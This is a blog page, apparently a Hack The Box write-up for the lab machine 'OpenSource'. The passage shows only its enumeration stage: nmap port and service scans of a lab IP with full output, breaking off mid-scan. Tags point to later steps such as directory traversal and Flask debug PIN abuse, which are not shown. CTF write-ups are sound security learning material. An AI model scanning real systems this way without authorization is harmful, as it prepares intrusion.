@@ -1,0 +1,258 @@
+<!doctype html><html lang=en><head><title>[HTB] Machine: OpenSource</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><link rel=stylesheet href=/application.650f674fc19266f4ea6c7b54bb6a4ffad10dfa641e3bea6de0a8472a99807590.css integrity="sha256-ZQ9nT8GSZvTqbHtUu2pP+tEN+mQeO+pt4KhHKpmAdZA="><link rel=icon type=image/png href=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png><meta property="og:title" content="[HTB] Machine: OpenSource"><meta property="og:description" content="[HTB] Machine: OpenSource"><meta property="og:type" content="article"><meta property="og:url" content="https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/opensource/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-28T00:00:00+00:00"><meta property="article:modified_time" content="2023-08-28T00:00:00+00:00"><meta name=description content="[HTB] Machine: OpenSource"></head><body class="type-posts kind-page" data-spy=scroll data-target=#TableOfContents data-offset=80><div class="container-fluid bg-dimmed wrapper"><nav class="navbar navbar-expand-xl top-navbar final-navbar shadow"><div class=container><button class="navbar-toggler navbar-light" id=sidebar-toggler type=button>
+<span class=navbar-toggler-icon></span></button>
+<a class=navbar-brand href=/><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png alt=Logo>
+Personal Blog</a>
+<button class="navbar-toggler navbar-light" id=toc-toggler type=button>
+<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse lang-selector" id=top-nav-items><ul class="navbar-nav ml-auto"><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href=# id=themeSelector role=button data-toggle=dropdown aria-haspopup=true aria-expanded=false><img id=navbar-theme-icon-svg src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a><div id=themeMenu class="dropdown-menu dropdown-menu-icons-only" aria-labelledby=themeSelector><a class="dropdown-item nav-link" href=# data-scheme=light><img class=menu-icon-center src=/icons/sun-svgrepo-com.svg width=20 alt="Light Theme"></a>
+<a class="dropdown-item nav-link" href=# data-scheme=dark><img class=menu-icon-center src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a>
+<a class="dropdown-item nav-link" href=# data-scheme=system><img class=menu-icon-center src=/icons/computer-svgrepo-com.svg width=20 alt="System Theme"></a></div></li></ul></div></div><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=main-logo alt=Logo>
+<img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=inverted-logo alt="Inverted Logo"></nav><section class=sidebar-section id=sidebar-section><div class=sidebar-holder><div class=sidebar id=sidebar><form class=mx-auto method=get action=/search><input type=text name=keyword placeholder=Search data-search id=search-box></form><div class=sidebar-tree><ul class=tree id=tree><li id=list-heading><a href=/posts/ data-filter=all>Posts</a></li><div class=subtree><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/>Cybersecurity</a><ul class=active><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/guided-hacking/>Guided Hacking</a><ul><li><a href=/posts/cybersecurity/guided-hacking/dll-injector/ title="[Guided Hacking] DLL Injector">[Guided Hacking] DLL Injector</a></li><li><a href=/posts/cybersecurity/guided-hacking/external-trainer/ title="[Guided Hacking] External Trainer">[Guided Hacking] External Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/internal-trainer/ title="[Guided Hacking] Internal Trainer">[Guided Hacking] Internal Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/overview/ title="[Guided Hacking] Overview">[Guided Hacking] Overview</a></li><li><a href=/posts/cybersecurity/guided-hacking/shellcode-injector/ title="[Guided Hacking] Shellcode Injector">[Guided Hacking] Shellcode Injector</a></li></ul></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/>Hackthebox</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/challenges/ title="[HTB] Challenges">[HTB] Challenges</a></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/>[HTB] Machines</a><ul class=active><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/linux/>[HTB] Linux Machines</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/machines/linux/academy/ title="[HTB] Machine: Academy">[HTB] Machine: Academy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/admirer/ title="[HTB] Machine: Admirer">[HTB] Machine: Admirer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile">[HTB] Machine: Agile</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique">[HTB] Machine: Antique</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/armageddon/ title="[HTB] Machine: Armageddon">[HTB] Machine: Armageddon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backdoor/ title="[HTB] Machine: Backdoor">[HTB] Machine: Backdoor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bagel/ title="[HTB] Machine: Bagel">[HTB] Machine: Bagel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bank/ title="[HTB] Machine: Bank">[HTB] Machine: Bank</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bashed/ title="[HTB] Machine: Bashed">[HTB] Machine: Bashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/beep/ title="[HTB] Machine: Beep">[HTB] Machine: Beep</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blocky/ title="[HTB] Machine: Blocky">[HTB] Machine: Blocky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blue/ title="[HTB] Machine: Blue">[HTB] Machine: Blue</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blunder/ title="[HTB] Machine: Blunder">[HTB] Machine: Blunder</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/ title="[HTB] Machine: BountyHunter">[HTB] Machine: BountyHunter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/busqueda/ title="[HTB] Machine: Busqueda">[HTB] Machine: Busqueda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cap/ title="[HTB] Machine: Cap">[HTB] Machine: Cap</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/curling/ title="[HTB] Machine: Curling">[HTB] Machine: Curling</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/delivery/ title="[HTB] Machine: Delivery">[HTB] Machine: Delivery</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/doctor/ title="[HTB] Machine: Doctor">[HTB] Machine: Doctor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/explore/ title="[HTB] Machine: Explore">[HTB] Machine: Explore</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/friendzone/ title="[HTB] Machine: FriendZone">[HTB] Machine: FriendZone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic">[HTB] Machine: Frolic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/goodgames/ title="[HTB] Machine: GoodGames">[HTB] Machine: GoodGames</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haystack/ title="[HTB] Machine: Haystack">[HTB] Machine: Haystack</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/help/ title="[HTB] Machine: Help">[HTB] Machine: Help</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/horizontall/ title="[HTB] Machine: Horizontall">[HTB] Machine: Horizontall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inject/ title="[HTB] Machine: Inject">[HTB] Machine: Inject</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked">[HTB] Machine: Irked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jupiter/ title="[HTB] Machine: Jupiter">[HTB] Machine: Jupiter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/knife/ title="[HTB] Machine: Knife">[HTB] Machine: Knife</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/laboratory/ title="[HTB] Machine: Laboratory">[HTB] Machine: Laboratory</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/ title="[HTB] Machine: LaCasaDePapel">[HTB] Machine: LaCasaDePapel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lame/ title="[HTB] Machine: Lame">[HTB] Machine: Lame</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/late/ title="[HTB] Machine: Late">[HTB] Machine: Late</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luanne/ title="[HTB] Machine: Luanne">[HTB] Machine: Luanne</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/metatwo/ title="[HTB] Machine: MetaTwo">[HTB] Machine: MetaTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mirai/ title="[HTB] Machine: Mirai">[HTB] Machine: Mirai</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/networked/ title="[HTB] Machine: Networked">[HTB] Machine: Networked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nibbles/ title="[HTB] Machine: Nibbles">[HTB] Machine: Nibbles</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nodeblog/ title="[HTB] Machine: NodeBlog">[HTB] Machine: NodeBlog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nunchucks/ title="[HTB] Machine: Nunchucks">[HTB] Machine: Nunchucks</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/ title="[HTB] Machine: OnlyForYou">[HTB] Machine: OnlyForYou</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/openadmin/ title="[HTB] Machine: OpenAdmin">[HTB] Machine: OpenAdmin</a></li><li><a class=active href=/posts/cybersecurity/hackthebox/machines/linux/opensource/ title="[HTB] Machine: OpenSource">[HTB] Machine: OpenSource</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pandora/ title="[HTB] Machine: Pandora">[HTB] Machine: Pandora</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/paper/ title="[HTB] Machine: Paper">[HTB] Machine: Paper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/photobomb/ title="[HTB] Machine: Photobomb">[HTB] Machine: Photobomb</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/postman/ title="[HTB] Machine: Postman">[HTB] Machine: Postman</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/precious/ title="[HTB] Machine: Precious">[HTB] Machine: Precious</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/previse/ title="[HTB] Machine: Previse">[HTB] Machine: Previse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redpanda/ title="[HTB] Machine: RedPanda">[HTB] Machine: RedPanda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/routerspace/ title="[HTB] Machine: RouterSpace">[HTB] Machine: RouterSpace</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/safe/ title="[HTB] Machine: Safe">[HTB] Machine: Safe</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/ title="[HTB] Machine: ScriptKiddie">[HTB] Machine: ScriptKiddie</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/secret/ title="[HTB] Machine: Secret">[HTB] Machine: Secret</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sense/ title="[HTB] Machine: Sense">[HTB] Machine: Sense</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shocker/ title="[HTB] Machine: Shocker">[HTB] Machine: Shocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shoppy/ title="[HTB] Machine: Shoppy">[HTB] Machine: Shoppy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/soccer/ title="[HTB] Machine: Soccer">[HTB] Machine: Soccer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/socket/ title="[HTB] Machine: Socket">[HTB] Machine: Socket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/spectra/ title="[HTB] Machine: Spectra">[HTB] Machine: Spectra</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/squashed/ title="[HTB] Machine: Squashed">[HTB] Machine: Squashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/steamcloud/ title="[HTB] Machine: SteamCloud">[HTB] Machine: SteamCloud</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stocker/ title="[HTB] Machine: Stocker">[HTB] Machine: Stocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sunday/ title="[HTB] Machine: Sunday">[HTB] Machine: Sunday</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/swagshop/ title="[HTB] Machine: SwagShop">[HTB] Machine: SwagShop</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tabby/ title="[HTB] Machine: Tabby">[HTB] Machine: Tabby</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/teacher/ title="[HTB] Machine: Teacher">[HTB] Machine: Teacher</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traceback/ title="[HTB] Machine: Traceback">[HTB] Machine: Traceback</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traverxec/ title="[HTB] Machine: Traverxec">[HTB] Machine: Traverxec</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/trick/ title="[HTB] Machine: Trick">[HTB] Machine: Trick</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/twomillion/ title="[HTB] Machine: TwoMillion">[HTB] Machine: TwoMillion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/valentine/ title="[HTB] Machine: Valentine">[HTB] Machine: Valentine</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/validation/ title="[HTB] Machine: Validation">[HTB] Machine: Validation</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writeup/ title="[HTB] Machine: Writeup">[HTB] Machine: Writeup</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/hackthebox/machines/windows/>[HTB] Windows Machines</a><ul><li><a href=/posts/cybersecurity/hackthebox/machines/windows/access/ title="[HTB] Machine: Access">[HTB] Machine: Access</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/active/ title="[HTB] Machine: Active">[HTB] Machine: Active</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/arctic/ title="[HTB] Machine: Arctic">[HTB] Machine: Arctic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastion/ title="[HTB] Machine: Bastion">[HTB] Machine: Bastion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bounty/ title="[HTB] Machine: Bounty">[HTB] Machine: Bounty</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/buff/ title="[HTB] Machine: Buff">[HTB] Machine: Buff</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/devel/ title="[HTB] Machine: Devel">[HTB] Machine: Devel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/driver/ title="[HTB] Machine: Driver">[HTB] Machine: Driver</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/escape/ title="[HTB] Machine: Escape">[HTB] Machine: Escape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/forest/ title="[HTB] Machine: Forest">[HTB] Machine: Forest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/grandpa/ title="[HTB] Machine: Grandpa">[HTB] Machine: Grandpa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/granny/ title="[HTB] Machine: Granny">[HTB] Machine: Granny</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/heist/ title="[HTB] Machine: Heist">[HTB] Machine: Heist</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jerry/ title="[HTB] Machine: Jerry">[HTB] Machine: Jerry</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/legacy/ title="[HTB] Machine: Legacy">[HTB] Machine: Legacy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/love/ title="[HTB] Machine: Love">[HTB] Machine: Love</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/nest/ title="[HTB] Machine: Nest">[HTB] Machine: Nest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/netmon/ title="[HTB] Machine: Netmon">[HTB] Machine: Netmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/omni/ title="[HTB] Machine: Omni">[HTB] Machine: Omni</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/optimum/ title="[HTB] Machine: Optimum">[HTB] Machine: Optimum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/remote/ title="[HTB] Machine: Remote">[HTB] Machine: Remote</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/return/ title="[HTB] Machine: Return">[HTB] Machine: Return</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna">[HTB] Machine: Sauna</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon">[HTB] Machine: Servmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/support/ title="[HTB] Machine: Support">[HTB] Machine: Support</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/timelapse/ title="[HTB] Machine: Timelapse">[HTB] Machine: Timelapse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/toolbox/ title="[HTB] Machine: Toolbox">[HTB] Machine: Toolbox</a></li></ul></li></ul></li><li><a href=/posts/cybersecurity/hackthebox/overview/ title="[HTB] Overview">[HTB] Overview</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pentesting/>Pentesting</a><ul><li><a href=/posts/cybersecurity/pentesting/active_directory/ title="[Pentesting] Active Directory">[Pentesting] Active Directory</a></li><li><a href=/posts/cybersecurity/pentesting/attacking_services/ title="[Pentesting] Attacking Services">[Pentesting] Attacking Services</a></li><li><a href=/posts/cybersecurity/pentesting/file_transfers/ title="[Pentesting] File Transfers">[Pentesting] File Transfers</a></li><li><a href=/posts/cybersecurity/pentesting/footprinting_and_enumeration/ title="[Pentesting] Footprinting and Enumeration">[Pentesting] Footprinting and Enumeration</a></li><li><a href=/posts/cybersecurity/pentesting/linux_privilege_escalation/ title="[Pentesting] Linux Privilege Escalation">[Pentesting] Linux Privilege Escalation</a></li><li><a href=/posts/cybersecurity/pentesting/mobile_pentesting/ title="[Pentesting] Mobile Pentesting">[Pentesting] Mobile Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/network_pentesting/ title="[Pentesting] Network Pentesting">[Pentesting] Network Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/osint/ title="[Pentesting] OSINT">[Pentesting] OSINT</a></li><li><a href=/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/ title="[Pentesting] Pivoting, Tunneling and Port Forwarding">[Pentesting] Pivoting, Tunneling and Port Forwarding</a></li><li><a href=/posts/cybersecurity/pentesting/shells_and_payloads/ title="[Pentesting] Shells and Payloads">[Pentesting] Shells and Payloads</a></li><li><a href=/posts/cybersecurity/pentesting/web_attacks/ title="[Pentesting] Web Attacks">[Pentesting] Web Attacks</a></li><li><a href=/posts/cybersecurity/pentesting/windows_privilege_escalation/ title="[Pentesting] Windows Privilege Escalation">[Pentesting] Windows Privilege Escalation</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pwn.college/>pwn.college</a><ul><li><a href=/posts/cybersecurity/pwn.college/overview/ title="[pwn.college] Overview">[pwn.college] Overview</a></li></ul></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/projects/>Projects</a><ul><li><a href=/posts/projects/ums/ title="[Projects] User-mode Scheduling (UMS)">[Projects] User-mode Scheduling (UMS)</a></li></ul></li></div></ul></div></div></div></section><section class=content-section id=content-section><div class=content><div class="container p-0 read-area"><div class="hero-area col-sm-12" id=hero-area style=background-image:url(/posts/cybersecurity/hackthebox/machines/linux/opensource/images/opensource.png)></div><div class=page-content><div class="author-profile ml-auto align-self-lg-center"><img class=rounded-circle src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_120x120_fit_box_3.png alt="Author Image"><h5 class=author-name>Bektur Umarbaev</h5><p>Monday, August 28, 2023</p></div><div class=title><h1>[HTB] Machine: OpenSource</h1></div><div class=taxonomy-terms><ul style=padding-left:0><li class=rounded><a href=/tags/htb/ class="btn, btn-sm">HTB</a></li><li class=rounded><a href=/tags/upload/ class="btn, btn-sm">upload</a></li><li class=rounded><a href=/tags/source-code/ class="btn, btn-sm">source-code</a></li><li class=rounded><a href=/tags/git/ class="btn, btn-sm">git</a></li><li class=rounded><a href=/tags/git-hooks/ class="btn, btn-sm">git-hooks</a></li><li class=rounded><a href=/tags/flask/ class="btn, btn-sm">flask</a></li><li class=rounded><a href=/tags/directory-traversal/ class="btn, btn-sm">directory-traversal</a></li><li class=rounded><a href=/tags/file-read/ class="btn, btn-sm">file-read</a></li><li class=rounded><a href=/tags/flask-debug/ class="btn, btn-sm">flask-debug</a></li><li class=rounded><a href=/tags/flask-debug-pin/ class="btn, btn-sm">flask-debug-pin</a></li><li class=rounded><a href=/tags/chisel/ class="btn, btn-sm">chisel</a></li><li class=rounded><a href=/tags/gitea/ class="btn, btn-sm">gitea</a></li><li class=rounded><a href=/tags/pspy/ class="btn, btn-sm">pspy</a></li><li class=rounded><a href=/tags/werkzeug/ class="btn, btn-sm">werkzeug</a></li><li class=rounded><a href=/tags/werkzeug-debug/ class="btn, btn-sm">werkzeug-debug</a></li></ul></div><div class=post-content id=post-content><h1 id=opensource>OpenSource</h1><h2 id=enumeration>Enumeration</h2><ul><li><code>nmap</code></li></ul><pre tabindex=0><code>└─$ nmap -Pn -p- 10.10.11.164 -T4 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:01 BST
+Stats: 0:11:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 97.88% done; ETC: 18:13 (0:00:15 remaining)
+Nmap scan report for 10.10.11.164 (10.10.11.164)
+Host is up (0.15s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+3000/tcp filtered ppp
+</code></pre><pre tabindex=0><code>└─$ nmap -Pn -sC -sV 10.10.11.164 -T4 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 18:14 BST
+Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 18:15 (0:00:42 remaining)
+Nmap scan report for 10.10.11.164 (10.10.11.164)
+Host is up (0.17s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
+|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
+|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
+80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
+|_http-title: upcloud - Upload files for Free!
+|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.1.2 Python/3.10.3
+|     Date: Mon, 28 Aug 2023 17:13:51 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 5316
+|     Connection: close
+|     &lt;html lang=&#34;en&#34;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&#34;UTF-8&#34;&gt;
+|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+|     &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt;
+|     &lt;script src=&#34;/static/vendor/jquery/jquery-3.4.1.min.js&#34;&gt;&lt;/script&gt;
+|     &lt;script src=&#34;/static/vendor/popper/popper.min.js&#34;&gt;&lt;/script&gt;
+|     &lt;script src=&#34;/static/vendor/bootstrap/js/bootstrap.min.js&#34;&gt;&lt;/script&gt;
+|     &lt;script src=&#34;/static/js/ie10-viewport-bug-workaround.js&#34;&gt;&lt;/script&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/vendor/bootstrap/css/bootstrap.css&#34;/&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34; /static/vendor/bootstrap/css/bootstrap-grid.css&#34;/&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34; /static/vendor/bootstrap/css/bootstrap-reboot.css&#34;/&gt;
+|     &lt;link rel=
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.1.2 Python/3.10.3
+|     Date: Mon, 28 Aug 2023 17:13:52 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Allow: OPTIONS, HEAD, GET
+|     Content-Length: 0
+|     Connection: close
+|   RTSPRequest: 
+|     &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 4.01//EN&#34;
+|     &#34;http://www.w3.org/TR/html4/strict.dtd&#34;&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html;charset=utf-8&#34;&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+3000/tcp filtered ppp
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.94%I=7%D=8/28%Time=64ECD5F3%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,1039,&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
+SF:ython/3\.10\.3\r\nDate:\x20Mon,\x2028\x20Aug\x202023\x2017:13:51\x20GMT
+SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
+SF:5316\r\nConnection:\x20close\r\n\r\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20
+SF:\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=
+SF:\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-scale=1\.0\&#34;&gt;\
+SF:n\x20\x20\x20\x20&lt;title&gt;upcloud\x20-\x20Upload\x20files\x20for\x20Free!
+SF:&lt;/title&gt;\n\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/static/vendor/jquery/jque
+SF:ry-3\.4\.1\.min\.js\&#34;&gt;&lt;/script&gt;\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/stat
+SF:ic/vendor/popper/popper\.min\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;script
+SF:\x20src=\&#34;/static/vendor/bootstrap/js/bootstrap\.min\.js\&#34;&gt;&lt;/script&gt;\n\
+SF:x20\x20\x20\x20&lt;script\x20src=\&#34;/static/js/ie10-viewport-bug-workaround
+SF:\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href
+SF:=\&#34;/static/vendor/bootstrap/css/bootstrap\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;li
+SF:nk\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;\x20/static/vendor/bootstrap/css/boo
+SF:tstrap-grid\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20hr
+SF:ef=\&#34;\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\&#34;/&gt;\n\n\x20
+SF:\x20\x20\x20&lt;link\x20rel=&#34;)%r(HTTPOptions,C7,&#34;HTTP/1\.1\x20200\x20OK\r\
+SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Mon,\x2028\
+SF:x20Aug\x202023\x2017:13:52\x20GMT\r\nContent-Type:\x20text/html;\x20cha
+SF:rset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET\r\nContent-Length:\x20
+SF:0\r\nConnection:\x20close\r\n\r\n&#34;)%r(RTSPRequest,1F4,&#34;&lt;!DOCTYPE\x20HTM
+SF:L\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x
